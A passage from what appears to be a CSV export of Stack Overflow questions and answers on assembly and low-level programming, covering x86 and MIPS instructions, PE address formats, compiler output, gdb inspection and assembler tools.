<p><a href=""https://github.com/dwelch67/stm32vld/"" rel=""nofollow"">https://github.com/dwelch67/stm32vld/</a> then stm32f4d/float01/vectors.s</p>

<p>I didnt time it though to see how fast/slow.  Understood I am using a cortex-m above and you are talking about a cortex-a, different ends of the spectrum, similar float instructions and the gcc lib stuff is similar, for the cortex-m I have to build for thumb but you can just as easily build for arm.  Actually with gcc it should all just work automagically you should not need to do it the way I did it.  Other compilers as well you should not need to do it the way I did it in the adventure game above.</p>
","8348414"
"The difference between cmpl and cmp","29132","","<p>I am trying to understand assembly to be able to solve a puzzle. However I encountered the following instructions:</p>

<pre><code>0x0000000000401136 &lt;+44&gt;:    cmpl   $0x7,0x14(%rsp)
0x000000000040113b &lt;+49&gt;:    ja     0x401230 &lt;phase_3+294&gt;
</code></pre>

<p>What I think its doing is:
The value  of 0x14(%rsp) is -7380. According to my understanding cmpl compares unsigned. Also the jump is performed. 
So can it be that (unsigned)-7380 > 7
(unsigned)7380 > 7--> jump</p>

<p>I actually don't want it to jump. But is this the correct explanation or not? Am I flipping arguments? </p>

<p>Also if you have any advice about how to manipulate this jump! </p>
","<blockquote>
  <p>According to my understanding <code>cmpl</code> compares unsigned.</p>
</blockquote>

<p>It does both, in a way.</p>

<p>The difference in signed vs. unsigned is here the usage of the jump instructions.</p>

<p>For <code>&gt;</code>, there is <code>ja</code> for unsigned and <code>jg</code> for signed (jump if above and jump if greater).</p>

<p>For <code>&lt;</code>, there is <code>jb</code> for unsigned and <code>jl</code> for signed (jump if below and jump if less).</p>

<p>To be exact, here is the meaning of several jump commands:</p>

<blockquote>
  <p>For unsigned comparisons:</p>

<pre><code>JB/JNAE (CF = 1)           : Jump if below/not above or equal
JAE/JNB (CF = 0)           : Jump if above or equal/not below
JBE/JNA (CF = 1 or ZF = 1) : Jump if below or equal/not above
JA/JNBE (CF = 0 and ZF = 0): Jump if above/not below or equal
</code></pre>
  
  <p>For signed comparisons:</p>

<pre><code>JL/JNGE (SF &lt;&gt; OF)          : Jump if less/not greater or equal
JGE/JNL (SF = OF)           : Jump if greater or equal/not less
JLE/JNG (ZF = 1 or SF &lt;&gt; OF): Jump if less or equal/not greater
JG/JNLE (ZF = 0 and SF = OF): Jump if greater/not less or equal
</code></pre>
</blockquote>
","24118885"
"x86_64 registers rax/eax/ax/al overwriting full register contents","28714","","<p>As it is widely advertised, modern x86_64 processors have 64-bit registers that can be used in backward-compatible fashion as 32-bit registers, 16-bit registers and even 8-bit registers, for example:</p>

<pre><code>0x1122334455667788
  ================ rax (64 bits)
          ======== eax (32 bits)
              ====  ax (16 bits)
              ==    ah (8 bits)
                ==  al (8 bits)
</code></pre>

<p>Such a scheme may be taken literally, i.e. one can always access only the part of the register using a designated name for reading or writing purposes, and it would be highly logical. In fact, this is true for everything up to 32-bit:</p>

<pre><code>mov  eax, 0x11112222 ; eax = 0x11112222
mov  ax, 0x3333      ; eax = 0x11113333 (works, only low 16 bits changed)
mov  al, 0x44        ; eax = 0x11113344 (works, only low 8 bits changed)
mov  ah, 0x55        ; eax = 0x11115544 (works, only high 8 bits changed)
xor  ah, ah          ; eax = 0x11110044 (works, only high 8 bits cleared)
mov  eax, 0x11112222 ; eax = 0x11112222
xor  al, al          ; eax = 0x11112200 (works, only low 8 bits cleared)
mov  eax, 0x11112222 ; eax = 0x11112222
xor  ax, ax          ; eax = 0x11110000 (works, only low 16 bits cleared)
</code></pre>

<p>However, things seem to be fairly awkward as soon as we get to 64-bit stuff:</p>

<pre><code>mov  rax, 0x1111222233334444 ;           rax = 0x1111222233334444
mov  eax, 0x55556666         ; actual:   rax = 0x0000000055556666
                             ; expected: rax = 0x1111222255556666
                             ; upper 32 bits seem to be lost!
mov  rax, 0x1111222233334444 ;           rax = 0x1111222233334444
mov  ax, 0x7777              ;           rax = 0x1111222233337777 (works!)
mov  rax, 0x1111222233334444 ;           rax = 0x1111222233334444
xor  eax, eax                ; actual:   rax = 0x0000000000000000
                             ; expected: rax = 0x1111222200000000
                             ; again, it wiped whole register
</code></pre>

<p>Such behavior seems to be highly ridiculous and illogical to me. It looks like trying to write anything at all to <code>eax</code> by any means leads to wiping of high 32 bits of <code>rax</code> register.</p>

<p>So, I have 2 questions:</p>

<ol>
<li><p>I believe that this awkward behavior must be documented somewhere, but I can't seem to find detailed explanation (of how exactly high 32 bits of 64-bit register get wiped) anywhere. Am I right that writing to <code>eax</code> always wipes <code>rax</code>, or it's something more complicated? Does it apply to all 64-bit registers, or there are some exceptions?</p>

<p>A <a href=""https://stackoverflow.com/questions/11822646/can-mov-eax-0x1-always-be-used-instead-of-mov-rax-0x1"">strongly related question</a> mentions the same behavior, but, alas, there are again no exact references to documentation.</p>

<p>In other words, I'd like a link to documentation that specifies this behavior.</p></li>
<li><p>Is it just me or this whole thing seems to be really weird and illogical (i.e. eax-ax-ah-al, rax-ax-ah-al having one behavior and rax-eax having another)? May be I'm missing some kind of vital point here on why was it implemented like that?</p>

<p>An explanation on ""why"" would be highly appreciated.</p></li>
</ol>
","<p>The processor model as documented in the Intel/AMD processor manual is a pretty imperfect model for the <em>real</em> execution engine of a modern core.  In particular, the notion of the processor registers does not match reality, there is no such thing as a EAX or RAX register.</p>

<p>One primary job of the instruction decoder is to convert the legacy x86/x64 instructions into <em>micro-ops</em>, instructions of a RISC-like processor.  Small instructions that are easy to execute concurrently and being able to take advantage of multiple execution sub-units.  Allowing as many as 6 instructions to execute at the same time.</p>

<p>To make that work, the notion of processor registers is virtualized as well.  The instruction decoder allocates a register from a big bank of registers.  When the instruction is <em>retired</em>, the value of that dynamically allocated register is written back to whatever register currently holds the value of, say, RAX.</p>

<p>To make that work smoothly and efficiently, allowing many instructions to execute concurrently, it is very important that these operations don't have an interdependency.  And the worst kind you can have is that the register value depends on other instructions.  The EFLAGS register is notorious, many instructions modify it.</p>

<p>Same problem with the way you <em>like</em> it to work.  Big problem, it requires two register values to be merged when the instruction is retired.  Creating a data dependency that's going to clog up the core.  By forcing the upper 32-bit to 0, that dependency instantly disappears, no longer a need to merge.  Warp 9 execution speed.</p>
","25456097"
"MIPS instruction set move vs add/addi 0 for storing values?","28686","","<p>I'm currently taking a Computer Organization and Assembly Language course that mainly uses the MIPS instruction set to teach assembly language.</p>

<p>I noticed that many of the examples that the professor has posted online use add or addi to move a value into the $a0 argument register for calling print services like the following...</p>

<pre><code># store the first integer in $a0 and print
add $a0, $zero, $t0
li $v0, 1
syscall
</code></pre>

<p>or...</p>

<pre><code># store the first integer in $a0 and print
addi $a0, $t0, 0
li $v0, 1
syscall
</code></pre>

<p>I've also noticed some examples online where others just use the move instruction to accomplish the same thing like the following...</p>

<pre><code># store the first integer in $a0 and print
move $a0, $t0
li $v0, 1
syscall
</code></pre>

<p>Is using the add or addi instruction preferred over simply using move in this scenario?  If so then why?  Is there a performance difference or is this just a matter of taste?  </p>
","<p>The <code>move</code> instruction is not a real instruction - it is a <em>pseudo instruction</em> that is translated into an <code>add</code> instruction by the assembler.</p>

<p>There are a whole bunch of these pseudo instructions, see e.g. <a href=""https://en.wikipedia.org/wiki/MIPS_architecture#Pseudo_instructions"" rel=""noreferrer"">https://en.wikipedia.org/wiki/MIPS_architecture#Pseudo_instructions</a></p>

<p>This type of thing is very common on RISC processors, where you want a minimal instruction set, and a particular instruction may be used for more than one purpose.</p>
","9116327"
"Using SSE instructions","28524","","<p>I have a loop written in C++ which is executed  for each element of a big integer array. Inside the loop, I mask some bits of the integer and then find the min and max values. I heard that if I use SSE instructions for these operations it will run much faster compared to a normal loop written using bitwise AND , and if-else conditions. My question is should I go for these SSE instructions? Also, what happens if my code runs on a different processor? Will it still work or these instructions are processor specific?</p>
","<ol>
<li>SSE instructions are processor specific. You can look up which processor supports which SSE version on wikipedia.</li>
<li>If SSE code will be faster or not depends on many factors: The first is of course whether the problem is memory-bound or CPU-bound. If the memory bus is the bottleneck SSE will not help much. Try simplifying your integer calculations, if that makes the code faster, it's probably CPU-bound, and you have a good chance of speeding it up.</li>
<li>Be aware that writing SIMD-code is a lot harder than writing C++-code, and that the resulting code is much harder to change. Always keep the C++ code up to date, you'll want it as a comment and to check the correctness of your assembler code.</li>
<li>Think about using a library like the IPP, that implements common low-level SIMD operations optimized for various processors.</li>
</ol>
","586670"
"VA (Virtual Address) & RVA (Relative Virtual Address)","28367","","<blockquote>
  <p>A file that is given as input to the linker is called <strong>Object File</strong>. 
  The linker produces an <strong>Image file</strong>, which in turn is used as input by the loader. </p>
</blockquote>

<p>A blurb from ""<strong>Microsoft Portable Executable and Common Object File Format Specification</strong>""</p>

<blockquote>
  <p><strong>RVA (relative virtual address)</strong>. In an image file, the address of an item
  after it is loaded into memory, with
  the base address of the image file
  subtracted from it. The RVA of an item
  almost always differs from its
  position within the file on disk (file
  pointer).</p>
  
  <p>In an object file, an RVA is less
  meaningful because memory locations
  are not assigned. In this case, an RVA
  would be an address within a section
  (described later in this table), to
  which a relocation is later applied
  during linking. For simplicity, a
  compiler should just set the first RVA
  in each section to zero.</p>
  
  <p><strong>VA (virtual address)</strong>. Same as RVA, except that the base address of the
  image file is not subtracted. The
  address is called a “VA” because
  Windows creates a distinct VA space
  for each process, independent of
  physical memory. For almost all
  purposes, a VA should be considered
  just an address. A VA is not as
  predictable as an RVA because the
  loader might not load the image at its
  preferred location.</p>
</blockquote>

<p>Even after reading this, I still don't get it. I've lot of questions. Can any one explain it in a practical way. Please stick to terminology of <code>Object File</code> &amp; <code>Image File</code> as stated. </p>

<p>All I know about addresses, is that </p>

<ul>
<li>Neither in the Object File nor in the Image File, we don't know the exact memory locations so, </li>
<li>Assembler while generating Object File computes addresses relative to sections <code>.data</code> &amp; <code>.text</code> (for function names).</li>
<li>Linker taking multiple object files as input generates one Image file. While generating, it first merges all the sections of each object file and while merging it recomputes the address offsets again relative to each section. And, there is nothing like global offsets. </li>
</ul>

<p>If there is some thing wrong in what I know, please correct me.</p>

<p><strong>EDIT:</strong></p>

<p>After reading answer given Francis, I'm clear about whats Physical Address, VA &amp; RVA and what are the relation between them. </p>

<p>RVAs of all variables&amp;methods must be computed by the Linker during relocation. So, <strong>(the value of RVA of a method/variable) == (its offset from the beginning of the file)</strong>? must been true. But surprisingly, its not. Why so?</p>

<p>I checked this by using <a href=""http://www.magma.ca/~wjr/PEview.zip"" rel=""noreferrer"">PEView</a>  on <code>c:\WINDOWS\system32\kernel32.dll</code> and found that:</p>

<ol>
<li>RVA &amp; FileOffset are same till the beginning of Sections.(<code>.text</code> is the first section in this dll). </li>
<li>From the beginning of <code>.text</code> through <code>.data</code>,<code>.rsrc</code> till the last byte of last section (<code>.reloc</code>) RVA &amp; FileOffset are different. &amp; also the RVA of first byte of the first section is ""always"" being shown as <code>0x1000</code></li>
<li>Interesting thing is that bytes of each section are continuous in FileOffset. I mean another section begins at the next byte of a section's last byte. But if I see the same thing in RVA, these is a huge gap in between RVAs of last byte of a section and first byte of next section. </li>
</ol>

<p>My Guess:</p>

<ol>
<li><p>All, the bytes of data that were
before the first (<code>.text</code> here)
section are ""not"" actually loaded
into VA space of the process, these
bytes of data are just used to
locate &amp; describe these sections.
They can be called, ""meta section
data"". </p>

<p>Since they are not loaded into VA
space of process. the usage of the
term RVA is also meaningless this is
the reason why <code>RVA == FileOffset</code> for these bytes.</p></li>
<li><p>Since, </p>

<ul>
<li>RVA term is valid for only those bytes which will be actually loaded
into the VA space. </li>
<li>the bytes of <code>.text</code>, <code>.data</code>, <code>.rsrc</code>, <code>.reloc</code> are such bytes.</li>
<li>Instead of starting from RVA <code>0x00000</code> PEView software is starting
it from <code>0x1000</code>.</li>
</ul></li>
<li><p>I cannot understand why the 3rd observation. I cannot explain.</p></li>
</ol>
","<p>Most Windows process (*.exe) are loaded in (user mode) memory address 0x00400000, that's what we call the ""virtual address"" (VA) - because they are visible only to each process, and will be converted to different physical addresses by the OS (visible by the kernel / driver layer).</p>

<p>For example, a possible physical memory address (visible by the CPU):</p>

<pre><code>0x00300000 on physical memory has process A's main
0x00500000 on physical memory has process B's main
</code></pre>

<p>And the OS may have a mapping table:</p>

<pre><code>process A's 0x00400000 (VA) = physical address 0x00300000
process B's 0x00400000 (VA) = physical address 0x00500000
</code></pre>

<p>Then when you try to read 0x004000000 in process A, you'll get the content which is located on 0x00300000 of physical memory.</p>

<p>Regarding RVA, it's simply designed to ease relocation. When loading relocable modules (eg, DLL) the system will try to slide it through process memory space. So in file layout it puts a ""relative"" address to help calculation.</p>

<p>For example, a DLL C may have this address:</p>

<pre><code> RVA 0x00001000 DLL C's main entry
</code></pre>

<p>When being loaded into process A at base address 0x10000000, C's main entry become</p>

<pre><code> VA = 0x10000000 + 0x00001000 = 0x10001000
 (if process A's VA 0x10000000 mapped to physical address was 0x30000000, then 
  C's main entry will be 0x30001000 for physical address).
</code></pre>

<p>When being loaded into process B at base address 0x32000000, C's main entry become</p>

<pre><code> VA = 0x32000000 + 0x00001000 = 0x32001000
 (if process B's VA 0x32000000 mapped to physical address was 0x50000000, then 
  C's main entry will be 0x50001000 for physical address).
</code></pre>

<p>Usually the RVA in image files is relative to process base address when being loaded into memory, but some RVA may be relative to the ""section"" starting address in image or object files (you have to check the PE format spec for detail). No matter which, RVA is relative to ""some"" base VA.</p>

<p>To summarize,</p>

<ol>
<li>Physical Memory Address is what CPU sees</li>
<li>Virtual Addreess (VA) is relative to Physical Address, per process (managed by OS)</li>
<li>RVA is relative to VA (file base or section base), per file (managed by linker and loader)</li>
</ol>

<p>(edit) regarding claw's new question:</p>

<p>The value of RVA of a method/variable is NOT always its offset from the beginning of the file. The are usually relative to some VA, which may be a default loading base address or section base VA - that's why I say you must check the PE format spec for detail.</p>

<p>You tool PEView is trying to display every byte's RVA to load base address. Since the sections start at different base, RVA may become different when crossing sections.</p>

<p>Regarding your guesses, the are very close to the correct answers:</p>

<ol>
<li><p>Usually we won't discuss the ""RVA"" before sections, but the PE header will still be loaded until the end of section headers. Gap between section header and section body (if any) won't be loaded. You can examine that by debuggers. Moreoever, when there's some gap between sections, they may be not loaded.</p></li>
<li><p>As I said, RVA is simply ""relative to some VA"", no matter what VA it is (although when talking about PE, the VA usually refers to the load base address). When you read thet PE format spec you may find some ""RVA"" which is relative to some special address like resource starting address. The PEView list RVA from 0x1000 is because that section starts at 0x1000. Why 0x1000? Because the linker left 0x1000 bytes for PE header, so the RVA starts at 0x1000.</p></li>
<li><p>What you've missed is the concept of ""section"" in PE loading stage. The PE may contain several ""sections"", each section maps to a new starting VA address. For example, this is dumped from win7 kernel32.dll:</p>

<pre><code>#  Name   VirtSize RVA      PhysSize Offset
1 .text   000C44C1 00001000 000C4600 00000800
2 .data   00000FEC 000C6000 00000E00 000C4E00
3 .rsrc   00000520 000C7000 00000600 000C5C00
4 .reloc  0000B098 000C8000 0000B200 000C6200
</code></pre>

<p>There is an invisible ""0 header RVA=0000, SIZE=1000"" which forced .text to start at RVA 1000. The sections should be continuous when being loaded into memory (i.e., VA) so their RVA is continuous. However since the memory is allocated by pages, it'll be multiple of page size (4096=0x1000 bytes). That's why #2 section starts at 1000 + C5000 = C6000 (C5000 comes from C44C1).</p>

<p>In order to provide memory mapping, these sections must still be aligned by some size (file alignment size - decide by linker. In my example above it's 0x200=512 bytes), which controls the PhysSize field. Offset means ""offset to physical PE file beginning"".</p>

<p>So the headers occupy 0x800 bytes of file (and 0x1000 when being mapped to memory), which is the offset of section #1. Then by aligning its data (c44c1 bytes), we get physsize C4600. C4600+800 = C4E00, which is exactly the offset of second section.</p>

<p>OK, this is related to whole PE loading stuff so it may be a little hard to understand...</p></li>
</ol>

<p>(edit) let me make a new simple summary again.</p>

<ol>
<li>The ""RVA"" in DLL/EXE (PE Format) files are usually relative to the ""load base address in memory"" (but not always - you must read the spec)</li>
<li>The PE Format contains a ""section"" mapping structure to map the physical file content into memory. So the RVA is not really relative to the file offset.</li>
<li>To calculate a RVA of some byte, you have to find its offset in the section and add the section base.</li>
</ol>
","2174223"
"How to generate assembly code with clang in Intel syntax?","28139","","<p>As <a href=""https://stackoverflow.com/questions/199966/how-do-you-use-gcc-to-generate-assembly-code-in-intel-syntax"">this question</a> shows, with g++, I can do <code>g++ -S -masm=intel test.cpp</code>.
Also, with clang, I can do <code>clang++ -S test.cpp</code>, but <code>-masm=intel</code> is not supported by clang (<code>warning argument unused during compilation: -masm=intel</code>). How do I get intel syntax with clang?</p>
","<p>This should get clang to emit assembly code with Intel syntax:</p>

<pre><code>clang++ -S -mllvm --x86-asm-syntax=intel test.cpp
</code></pre>

<p>You can use <code>-mllvm &lt;arg&gt;</code> to pass in llvm options from the clang command line. Sadly this option doesn't appear to be well documented, and thus I only found it by browsing through the llvm mailing lists.</p>

<hr>

<p>As <a href=""https://stackoverflow.com/a/23630416/1172350"">noted below by @thakis</a>, this is no longer needed in newer versions of Clang (3.5+) as it now support the <code>-masm=intel</code> syntax.</p>
","11957826"
"MIPS assembly: how to declare integer values in the .data section?","27834","","<p>I'm trying to get my feet wet with MIPS assembly language using the <a href=""http://courses.missouristate.edu/KenVollmar/MARS/"" rel=""nofollow noreferrer"">MARS simulator</a>.  </p>

<p>My main problem now is how do I initialize a set of memory locations so that I can access them later via assembly language instructions?  </p>

<p>For example, I want to initialize addresses 0x1001000 - 0x10001003 with the values 0x99, 0x87, 0x23, 0x45.  I think this can be done in the data declaration (.data) section of my assembly program but I'm not sure of the syntax.  Is this possible?</p>

<p>Alternatively, in the .data section, how do I specify storing the integer values in some memory location (I don't care where, but I just want to reference them somewhere).  So I'm looking for the C equivalent of  ""int x = 20, y=30, z=90;"" I know how to do that using MIPS instructions but is it possible to declare something like that in the .data section of a MIPS assembly program?</p>
","<p>You don't usually initialize specific memory locations; each section (including .data) is positioned at link time, and relocations are resolved then</p>

<p>To make a relocation on a data entry, you choose a name and put <code>name:</code> before it, so you can refer to it by name later. You specify a data block using <code>.size value</code>. For example:</p>

<pre><code>.data
    x: .word 20
    y: .word 30
    z: .word 90
</code></pre>

<p>Then you can use the labels in your assembly:</p>

<pre><code>.text
    lw $t0, x
</code></pre>
","2619747"
"Which is faster : if (bool) or if(int)?","27772","","<blockquote>
  <p><a href=""https://stackoverflow.com/questions/5554725/which-value-is-better-to-use-boolean-true-or-integer-1"">Which value is better to use? Boolean true or Integer 1?</a></p>
</blockquote>

<p>The above topic made me do some experiments with <code>bool</code> and <code>int</code> in <code>if</code> condition. So just out of curiosity I wrote this program:</p>

<pre><code>int f(int i) 
{
    if ( i ) return 99;   //if(int)
    else  return -99;
}
int g(bool b)
{
    if ( b ) return 99;   //if(bool)
    else  return -99;
}
int main(){}
</code></pre>

<p><code>g++ intbool.cpp -S</code> generates asm code for each functions as follows:</p>

<ul>
<li><p>asm code for <code>f(int)</code></p>

<pre><code>__Z1fi:
   LFB0:
         pushl  %ebp
   LCFI0:
          movl  %esp, %ebp
   LCFI1:
          cmpl  $0, 8(%ebp)
          je    L2
          movl  $99, %eax
          jmp   L3
   L2:
          movl  $-99, %eax
   L3:
          leave
   LCFI2:
          ret
</code></pre></li>
<li><p>asm code for <code>g(bool)</code></p>

<pre><code>__Z1gb:
   LFB1:
          pushl %ebp
   LCFI3:
          movl  %esp, %ebp
   LCFI4:
          subl  $4, %esp
   LCFI5:
          movl  8(%ebp), %eax
          movb  %al, -4(%ebp)
          cmpb  $0, -4(%ebp)
          je    L5
          movl  $99, %eax
          jmp   L6
   L5:
          movl  $-99, %eax
   L6:
          leave
   LCFI6:
          ret
</code></pre></li>
</ul>

<p>Surprisingly, <code>g(bool)</code> generates more <code>asm</code> instructions! Does it mean that <code>if(bool)</code> is little slower than <code>if(int)</code>? I used to think <code>bool</code> is especially designed to be used in conditional statement such as <code>if</code>, so I was expecting <code>g(bool)</code> to generate less asm instructions, thereby making <code>g(bool)</code> more efficient and fast. </p>

<p>EDIT:</p>

<p>I'm not using any optimization flag as of now. But even absence of it, why does it generate more asm for <code>g(bool)</code> is a question for which I'm looking for a reasonable answer. I should also tell you that <code>-O2</code> optimization flag generates exactly same asm. But that isn't the question. The question is what I've asked.</p>

<hr>
","<p>Makes sense to me. Your compiler apparently defines a <code>bool</code> as an 8-bit value, and your system ABI requires it to ""promote"" small (&lt; 32-bit) integer arguments to 32-bit when pushing them onto the call stack. So to compare a <code>bool</code>, the compiler generates code to isolate the least significant byte of the 32-bit argument that g receives, and compares it with <code>cmpb</code>. In the first example, the <code>int</code> argument uses the full 32 bits that were pushed onto the stack, so it simply compares against the whole thing with <code>cmpl</code>.</p>
","5765029"
"Generating a random number within range of 0-9 in x86 8086 Assembly","27764","","<p>First of all, I am very new to 8086 Assembly and it has been pretty difficult for me the grab the knowledge. Nevertheless, I'll do my best.</p>

<p>I have been trying to write a code to generate a random number within range of 0-9. After looking into several examples and suggestion, this is what I ended up with. I did not apply any mathematical function on the retrieved clock count, for simplicity and also I thought it was unnecessary. I ended up with, for some reasons, generating certain number like 6,7 fewer times than numbers such as 1,3 and 9. I believe it is because I'm taking the lower order of the clock ticks, where the values change so rapidly.</p>

<p>My purpose is to simulate a dice roll which later ill change the range of below codes to 1-6.
My question is, Is this adequate enough for my purpose? or is there any better way to do this?</p>

<p>codes:</p>

<pre><code>RANDGEN:        ; generate a rand no using the system time
RANDSTART:
   MOV AH, 00h  ; interrupts to get system time        
   INT 1AH      ; CX:DX now hold number of clock ticks since midnight      
                ; lets just take the lower bits of DL for a start..
   MOV BH, 57   ; set limit to 57 (ASCII for 9) 
   MOV AH, DL  
   CMP AH, BH   ; compare with value in  DL,      
   JA RANDSTART ; if more, regenerate. if not, continue... 

   MOV BH, 49   ; set limit to 48 (ASCII FOR 0)
   MOV AH, DL   
   CMP AH, BH   ; compare with value in DL
   JB RANDSTART ; if less, regenerate.   


   ; if not, this is what we need 
   mov ah, 2h   ; call interrupt to display a value in DL
   int 21h    
RET
</code></pre>

<p>Answer, by @johnfound:</p>

<p>I found his way is simpler, and takes less time to generate the random number. He mentioned that this works only if you need one single random numbers, or the interval between the random numbers includes pauses for human input. If not, the numbers will not be random at all (I believe due to the time seed that we initially take doesn't change). It is fine for my case, since I am simulating a roll dice, and I need the user intervention (another roll) before I will be running the code again.</p>

<pre><code>RANDGEN:         ; generate a rand no using the system time
RANDSTART:
   MOV AH, 00h  ; interrupts to get system time        
   INT 1AH      ; CX:DX now hold number of clock ticks since midnight      

   mov  ax, dx
   xor  dx, dx
   mov  cx, 10    
   div  cx       ; here dx contains the remainder of the division - from 0 to 9

   add  dl, '0'  ; to ascii from '0' to '9'
   mov ah, 2h   ; call interrupt to display a value in DL
   int 21h    
RET    
</code></pre>

<p>What he did:
1.We moved value in DX to AX 
2.We cleared DX. 
3.We moved 10 dec to CX. 
4.We divided AX by CX hence we get a remainder within 0-9 Dec which is stored in DX 5.Finally, we added ASCII '0' (dec 48) to DX to get them into ASCII '0' to '9'.</p>
","<p>This trick works only if you need one single random numbers, or the interval between the random numbers includes pauses for <strong>human input</strong>. In all other cases, the numbers will not be random at all.</p>

<p>If you need many random numbers, then there are different pseudo-random number algorithms available.</p>

<p>Another note is that there is more easy way to get the number in the needed interval:</p>

<pre><code>    mov  ax, dx
    xor  dx, dx
    mov  cx, 10    
    div  cx       ; here dx contains the remainder of the division - from 0 to 9

    add  dl, '0'  ; to ascii from '0' to '9'
</code></pre>

<p>You can use this method for every random number generator of course.</p>
","17856347"
"Display value found at given address gdb","27273","","<p>I am debugging a binary file in gdb. It was C code compiled by gcc on an Intel IA-32. I retrieved this output from <code>objdump</code>. I am most interested in the last line here:</p>

<pre><code>08048d9e &lt;func_1&gt;
8048d9e:    55                      push   %ebp
8048d9f:    89 e5                   mov    %esp,%ebp
8048da1:    83 ec 18                sub    $0x18,%esp
8048da4:    c7 44 24 04 88 99 04    movl   $0x8049988,0x4(%esp)
8048dab:    08 
8048dac:    8b 45 08                mov    0x8(%ebp),%eax
8048daf:    89 04 24                mov    %eax,(%esp)
8048db2:    e8 54 01 00 00          call   8048f0b &lt;strings_not_equal&gt;
</code></pre>

<p>I believe this last line will compare the value found at the indicated address: <code>8048f0b</code>. I attempt:</p>

<pre><code>(gdb) x 0x8048f0b
</code></pre>

<p>and receive:</p>

<pre><code>0x8048f0b &lt;strings_not_equal&gt;:  0x57e58955
</code></pre>

<p>Am I interpreting the assembly incorrectly? Is this the correct way to read the value of an address in gdb? I was kind of expecting to find a more ascii friendly hex value. I am interested in finding the stored string value that is compared against.</p>

<p>Also do you have a favorite gui tool that you like to use for this type of debugging? I have been thinking about trying ddd. I want to find an easier way to debug.</p>
","<p>You are correctly reading the value at memory address <code>0x8048f0b</code>, but the line <code>call   8048f0b &lt;strings_not_equal&gt;</code> indicates that this address is the start of a function (called <code>strings_not_equal()</code>).  You wouldn't expect that to be ASCII - you'd expect it to be more machine code.</p>

<p>If you're looking for the function arguments to <code>strings_not_equal()</code>, those are being pushed onto the stack.  The first argument is being copied from <code>0x8(%ebp)</code>, which is the first argument of <code>func1()</code>.  The second argument is <code>$0x8049988</code>, which is presumably the address of a string.</p>

<p>If you want to print the contents of the address as a string, you can do that with <code>x/s</code>:</p>

<pre><code>x/s 0x8049988
</code></pre>
","14493796"
"Accessing one character in a string","27028","","<p>I am using something like SPIMS or MARS with syscall functions. </p>

<p>I am reading in a string (and it works because I can print it out) as follows:</p>

<pre><code>li $v0, 8
la $a0, string
li $a1, 256
syscall
</code></pre>

<p>However, I am having a problem accessing a single character of the string. So if I want to access the first character and print it, I am trying this:</p>

<pre><code>la $t0, string
lb $a0, ($t0)
li $v0, 4
sys call
</code></pre>

<p>If I try something like this:</p>

<pre><code>la $a0, string
li $v0, 4
syscall
</code></pre>

<p>This prints out the whole string as string points to the whole string.</p>

<p>If I try something like:</p>

<pre><code>la $a0, string
lb $a0, ($t0)
li $v0, 4
syscall
</code></pre>

<p>It gives me an out of bound error. I don't understand why though - isn't a character a byte long and this just loads the first byte from the string into $a0?</p>

<p>Thank you</p>
","<p>Looking at the <a href=""http://courses.missouristate.edu/KenVollmar/MARS/Help/SyscallHelp.html"" rel=""noreferrer"">documentation</a> for the MARS syscall functions you can see that service 4, which you're using, expects <code>$a0</code> to be ""[the] address of null-terminated string to print"", which explains the behavior you're seeing. </p>

<p>What you want is function 11 ""print character"", which prints the low-order byte as a character. In other words the following should work (not tested):</p>

<pre><code>la $t0, string
lb $a0, ($t0)
li $v0, 11
syscall
</code></pre>
","7590524"
"Running Assembly programs in command prompt w/ windows 7","26950","","<p>I was wondering how to run debug in command prompt in Windows 7. I have looked this up online, finding only that you can find the debug.exe in the System32 file, but it is not. If this is not possible, is there any other comparable program for compiling and editing Assembly programs?</p>
","<p>You don't compile Assembly code, you Assemble and optionally Link.</p>

<p>Popular Assemblers:</p>

<ul>
<li><a href=""http://www.masm32.com/"" rel=""nofollow"">MASM/MASM32</a> </li>
<li><a href=""http://flatassembler.net/"" rel=""nofollow"">FASM</a></li>
<li><a href=""http://www.nasm.us/"" rel=""nofollow"">NASM</a></li>
<li><a href=""http://www.japheth.de/JWasm.html"" rel=""nofollow"">JWASM</a></li>
<li><a href=""http://yasm.tortall.net/"" rel=""nofollow"">YASM</a></li>
<li><a href=""http://www.godevtool.com/"" rel=""nofollow"">GoASM</a></li>
<li><a href=""http://www.smorgasbordet.com/pellesc/"" rel=""nofollow"">PoASM</a></li>
</ul>

<p>Many are able to Assemble 32 or 64 bit instructions.  All will run on Windows 7.  I think all will also Assemble 16 bit code, but 16bit DOS apps will not run on Windows 7 without a DOS emulator.  You could use <a href=""http://dfendreloaded.sourceforge.net/"" rel=""nofollow"">D-Fend Reloaded</a> which is a DOSBox Frontend and works well.
A good free debugger is <a href=""http://www.ollydbg.de/"" rel=""nofollow"">OllyDbg</a></p>

<p>To edit Assembler source files, all you need is notepad really.  You could use Visual Studio.  I use <a href=""http://www.geany.org/"" rel=""nofollow"">Geany</a> on Windows and Linux.  There is also <a href=""https://fbedit.svn.sourceforge.net/svnroot/fbedit/RadASM/ReleaseMake/Release.zip"" rel=""nofollow"">RadASM v2</a> which is a good free IDE for with a resource editor, also <a href=""https://fbedit.svn.sourceforge.net/svnroot/fbedit/RadASM30/Release/RadASM.zip"" rel=""nofollow"">RadASM v3</a>.  <a href=""http://www.winasm.net/winasm-studio-downloads.html"" rel=""nofollow"">WinASM</a> is also a decent Assembly IDE.</p>
","13522319"
"Can gcc compile x86 assembly or just link it?","26943","","<p>gcc can produce assembly but how do I compile pure assembly with gcc or other compiler? I know x86 assembly is difficult and another instruction set than the MIPS and Nios I was looking at but now I want to try to compile direct x86 asm. There are instruction for how to do it but there's a C file included and I don't need a C file for my first most basic compile.</p>

<pre><code>gcc -o test_asm asm_functions.S test_asm.c
</code></pre>

<p>There's the step creating <code>.o</code> files</p>

<pre><code>gcc -c asm_functions.S
gcc -c test_asm.c
gcc -o test_asm asm_functions.o test_asm.o
</code></pre>

<p>But I don't see the step where I can directly compile x86 asm with gcc. There's another program named GNU as (GNU Assembler), can it be used to translate x86 assembly to machine code? </p>

<h2>Test</h2>

<p>Code (32.s)</p>

<pre><code>.globl  _start

.text
_start:
        movl    $len, %edx
        movl    $msg, %ecx
        movl    $1, %ebx
        movl    $4, %eax
        int     $0x80

        movl    $0, %ebx
        movl    $1, %eax
        int     $0x80
.data
msg:
        .ascii  ""Hello, world!\n""
        len =   . - msg
</code></pre>

<p>Steps</p>

<pre><code>$ gcc -c 32.s 
$ ls 32*
32.o  32.s
$ gcc -o 32 32.o 
32.o: In function `_start':
(.text+0x0): multiple definition of `_start'
/usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crt1.o:(.text+0x0): first defined here
/usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crt1.o: In function `_start':
(.text+0x20): undefined reference to `main'
</code></pre>

